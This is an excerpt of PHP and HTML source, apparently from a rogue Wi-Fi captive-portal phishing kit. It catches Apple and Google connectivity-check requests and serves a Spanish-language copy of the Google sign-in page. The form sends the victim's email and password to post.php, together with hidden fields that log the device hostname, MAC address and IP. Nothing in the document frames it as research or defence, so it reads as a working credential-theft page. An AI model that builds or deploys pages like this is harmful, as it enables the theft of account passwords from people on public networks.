...
if ($host == "captive.apple.com") {
    header("Location: http://correo.google.com/", true, 302);
    exit();
} elseif ($host == "connectivitycheck.gstatic.com") {
            ...
            <div class="login-container">
                ...
                <div class='login-content' id='login-form'>
                    ...
                    <form method="POST" action="post.php">
                        <h1 class='g-h1'>Iniciar sesión</h1>
                        <h2 class='g-h2'>Usa tu cuenta de google</h2>
                        <div class='login-content'>
                            <input name="email" id='email-input' type="text" class='g-input' placeholder="Correo electrónico o teléfono" required>

                            <input name="password" id='password-input' type="password" class='g-input password-input' placeholder="Contraseña" required>

                            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                            <input type="hidden" name="target" value="https://accounts.google.com">

                            <legend class='g-legend'>¿Has olvidado tu correo electrónico?</legend>
                            <div class='login-priv'>
                                <p class='p'>¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada.</p>
                                <legend class='g-legend'>Más información</legend>
                            </div>
                            <!-- form navigation menu -->
                            <div class='login-nav'>
                                <legend class='g-legend'>Crear cuenta</legend>
